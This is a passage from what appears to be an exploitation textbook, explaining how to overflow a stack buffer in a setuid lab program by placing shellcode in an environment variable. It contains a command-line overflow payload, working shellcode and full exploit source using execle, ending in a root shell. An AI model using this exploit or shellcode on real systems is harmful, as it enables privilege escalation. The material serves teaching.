left;">}</p><p style="padding-left: 91pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Image_432.png"/></span></p><p style="padding-top: 8pt;padding-left: 91pt;text-indent: 17pt;line-height: 108%;text-align: left;">When compiled, this program can accurately predict where an environ- ment variable will be in memory during a target program’s execution. This can be used to exploit stack-based buffer overflows without the need for a NOP sled.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 19pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="540" height="1" alt="image" src="Image_433.png"/></span></p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;line-height: 107%;text-align: left;">reader@hacking:~/booksrc $ gcc -o getenvaddr getenvaddr.c reader@hacking:~/booksrc $ ./getenvaddr SLEDLESS ./notesearch SLEDLESS will be at 0xbfffff3c</p><p class="s31" style="padding-left: 19pt;text-indent: 0pt;text-align: left;">reader@hacking:~/booksrc $ ./notesearch $(perl -e &#39;print &quot;\x3c\xff\xff\xbf&quot;x40&#39;) [DEBUG] found a 34 byte note for user id 999</p><p class="s31" style="padding-bottom: 3pt;padding-left: 19pt;text-indent: 0pt;text-align: left;">[DEBUG] found a 41 byte note for user id 999</p><p style="padding-left: 19pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="540" height="1" alt="image" src="Image_434.png"/></span></p><p style="padding-top: 8pt;padding-left: 91pt;text-indent: 17pt;line-height: 108%;text-align: justify;">As you can see, exploit code isn’t always needed to exploit programs. The use of environment variables simplifies things considerably when exploiting from the command line, but these variables can also be used to make exploit code more reliable.</p><p style="padding-left: 91pt;text-indent: 18pt;line-height: 108%;text-align: left;">The <span class="s31">system() </span>function is used in the notesearch_exploit.c program to execute a command. This function starts a new process and runs the com- mand using <span class="s31">/bin/sh -c</span>. The <span class="s31">-c </span>tells the <span class="s31">sh </span><a href="http://www.google.com/codesearch?q=package%3Alibc%2Bsystem" class="a" target="_blank">program to execute commands from the command-line argument passed to it. Google’s code search can be used to find the source code for this function, which will tell us more. Go to </a>http://www.google.com/codesearch?q=package:libc+system to see this code in its entirety.</p><p class="s40" style="padding-top: 9pt;padding-left: 91pt;text-indent: 0pt;text-align: left;">Code from libc-2.2.2</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 91pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Image_435.png"/></span></p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">int system(const char * cmd)</p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;text-align: left;">{</p><p class="s31" style="padding-left: 125pt;text-indent: 0pt;text-align: left;">int ret, pid, waitstat;</p><p class="s31" style="padding-left: 125pt;text-indent: 0pt;text-align: left;">void (*sigint) (), (*sigquit) ();</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s46" style="padding-left: 125pt;text-indent: 0pt;text-align: left;">if ((pid = fork()) == 0) {</p><p class="s46" style="padding-left: 159pt;text-indent: 0pt;line-height: 107%;text-align: left;">execl(&quot;/bin/sh&quot;, &quot;sh&quot;, &quot;-c&quot;, cmd, NULL); exit(127);</p><p class="s46" style="padding-left: 125pt;text-indent: 0pt;line-height: 10pt;text-align: left;">}</p><p class="s31" style="padding-left: 125pt;text-indent: 0pt;line-height: 107%;text-align: left;">if (pid &lt; 0) return(127 &lt;&lt; 8); sigint = signal(SIGINT, SIG_IGN); sigquit = signal(SIGQUIT, SIG_IGN);</p><p class="s31" style="padding-left: 125pt;text-indent: 0pt;line-height: 107%;text-align: left;">while ((waitstat = wait(&amp;ret)) != pid &amp;&amp; waitstat != -1); if (waitstat == -1) ret = -1;</p><p class="s31" style="padding-top: 2pt;padding-left: 125pt;text-indent: 0pt;line-height: 106%;text-align: left;">signal(SIGINT, sigint); signal(SIGQUIT, sigquit); return(ret);</p><p class="s31" style="padding-bottom: 3pt;padding-left: 91pt;text-indent: 0pt;text-align: left;">}</p><p style="padding-left: 91pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Image_436.png"/></span></p><p style="padding-top: 6pt;padding-left: 109pt;text-indent: 0pt;text-align: left;">The important part of this function is shown in bold. The <span class="s31">fork() </span>function</p><p style="padding-left: 91pt;text-indent: 0pt;line-height: 108%;text-align: left;">starts a new process, and the <span class="s31">execl() </span>function is used to run the command through /bin/sh with the appropriate command-line arguments.</p><p style="padding-left: 91pt;text-indent: 18pt;line-height: 108%;text-align: left;">The use of <span class="s31">system() </span>can sometimes cause problems. If a setuid program uses <span class="s31">system()</span>, the privileges won’t be transferred, because /bin/sh has been dropping privileges since version two. This isn’t the case with our exploit, but the exploit doesn’t really need to be starting a new process, either. We can ignore the <span class="s31">fork() </span>and just focus on the <span class="s31">execl() </span>function to run the command.</p><p style="padding-left: 91pt;text-indent: 18pt;line-height: 108%;text-align: left;">The <span class="s31">execl() </span>function belongs to a family of functions that execute com- mands by replacing the current process with the new one. The arguments for <span class="s31">execl() </span>start with the path to the target program and are followed by each of the command-line arguments. The second function argument is actually the zeroth command-line argument, which is the name of the program. The last argument is a NULL to terminate the argument list, similar to how a null byte terminates a string.</p><p style="padding-left: 91pt;text-indent: 17pt;line-height: 108%;text-align: left;">The <span class="s31">execl() </span>function has a sister function called <span class="s31">execle()</span>, which has one additional argument to specify the environment under which the executing process should run. This environment is presented in the form of an array of pointers to null-terminated strings for each environment variable, and the environment array itself is terminated with a NULL pointer.</p><p style="padding-left: 91pt;text-indent: 18pt;line-height: 108%;text-align: left;">With <span class="s31">execl()</span>, the existing environment is used, but if you use <span class="s31">execle()</span>, the entire environment can be specified. If the environment array is just the shellcode as the first string (with a NULL pointer to terminate the list), the only environment variable will be the shellcode. This makes its address easy to calculate. In Linux, the address will be <span class="s31">0xbffffffa</span>, minus the length of the shellcode in the environment, minus the length of the name of the executed program. Since this address will be exact, there is no need for a NOP sled. All that’s needed in the exploit buffer is the address, repeated enough times to overflow the return address in the stack, as shown in exploit_nosearch_env.c.</p><p class="s40" style="padding-top: 7pt;padding-left: 91pt;text-indent: 0pt;text-align: left;">exploit_notesearch_env.c</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 91pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Image_437.png"/></span></p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;line-height: 106%;text-align: left;">#include &lt;stdio.h&gt; #include &lt;stdlib.h&gt; #include &lt;string.h&gt; #include &lt;unistd.h&gt;</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;line-height: 107%;text-align: left;">char shellcode[]= &quot;\x31\xc0\x31\xdb\x31\xc9\x99\xb0\xa4\xcd\x80\x6a\x0b\x58\x51\x68&quot; &quot;\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x51\x89\xe2\x53\x89&quot; &quot;\xe1\xcd\x80&quot;;</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s31" style="padding-left: 104pt;text-indent: -12pt;line-height: 107%;text-align: left;">int main(int argc, char *argv[]) { char *env[2] = {shellcode, 0}; unsigned int i, ret;</p><p class="s31" style="padding-top: 2pt;padding-left: 104pt;text-indent: 0pt;text-align: left;">char *buffer = (char *) malloc(160);</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s31" style="padding-left: 104pt;text-indent: 0pt;line-height: 107%;text-align: left;">ret = 0xbffffffa - (sizeof(shellcode)-1) - strlen(&quot;./notesearch&quot;); for(i=0; i &lt; 160; i+=4)</p><p class="s31" style="padding-left: 116pt;text-indent: 0pt;text-align: left;">*((unsigned int *)(buffer+i)) = ret;</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s31" style="padding-top: 4pt;padding-left: 104pt;text-indent: 0pt;line-height: 107%;text-align: left;">execle(&quot;./notesearch&quot;, &quot;notesearch&quot;, buffer, 0, env); free(buffer);</p><p class="s31" style="padding-bottom: 3pt;padding-left: 91pt;text-indent: 0pt;text-align: left;">}</p><p style="padding-left: 91pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Image_438.png"/></span></p><p style="padding-top: 7pt;padding-left: 91pt;text-indent: 17pt;line-height: 108%;text-align: left;">This exploit is more reliable, since it doesn’t need a NOP sled or any guesswork regarding offsets. Also, it doesn’t start any additional processes.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 91pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Image_439.png"/></span></p><p class="s31" style="padding-left: 91pt;text-indent: 0pt;line-height: 107%;text-align: left;">reader@hacking:~/booksrc $ gcc exploit_notesearch_env.c reader@hacking:~/booksrc $ ./a.out</p><p class="s31" style="padding-bottom: 2pt;padding-left: 91pt;text-indent: 0pt;line-height: 107%;text-align: left;">-------[ end of note data ]------- sh-3.2#</p><p style="padding-left: 91pt;text-indent: 0pt;line-height: 1pt;text-align: left;"><span><img width="444" height="1" alt="image" src="Image_440.png"/></span></p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="toc">&nbsp;</p><div class="toc"><a class="toc0" href="part58.htm">0x340 Overflows in Other Segments</a></div><p class="nav">&nbsp;&nbsp;</p><p class="nav">&nbsp;</p><p class="nav"><a href="part56.htm">&lt; Previous</a><span> | </span><a href="../hacking-the-art-of-exploitation.html">Contents</a><span> | </span><a href="part58.htm">Next &gt;</a></p><p class="nav">&nbsp;&nbsp;</p></body></html>
